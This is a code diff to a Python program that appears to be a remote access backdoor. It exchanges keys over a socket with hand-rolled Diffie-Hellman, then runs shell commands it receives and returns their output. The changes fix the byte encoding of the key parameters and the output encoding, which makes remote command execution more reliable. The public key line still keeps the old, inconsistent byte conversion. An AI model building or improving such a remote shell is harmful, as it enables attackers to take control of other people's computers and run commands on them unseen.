@@ -1,4 +1,4 @@
-import os, socket, subprocess, hashlib, random, string, time, json
+import os, socket, subprocess, hashlib, random, string, time, json, locale
 import DH_key_exchange as DH_KEY
 
 if os.name == "nt":
@@ -45,9 +45,9 @@ while True:
         # encryption key
         p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1
         g = 2
-        conn.send(p.to_bytes(len(str(p)), "big"))
+        conn.send(p.to_bytes((p.bit_length() +7)//8, "big"))
         time.sleep(1)
-        conn.send(g.to_bytes(len(str(g)), "big"))
+        conn.send(g.to_bytes((g.bit_length()+7)//8, "big"))
 
         fernet = DH_KEY.DH(p, g)
         conn.send(fernet.public_key.to_bytes(len(str(fernet.public_key)), "big"))
@@ -131,7 +131,7 @@ while True:
                 break
             else:
                 try:
-                    result = subprocess.run(CMD, shell=True, capture_output=True, text=True, encoding="cp1252", errors="replace")
+                    result = subprocess.run(CMD, shell=True, capture_output=True, text=True, encoding=locale.getpreferredencoding(False), errors="replace")
                     out = result.stdout + result.stderr
                     if not out:
                         out = "OK [command w/o output]"
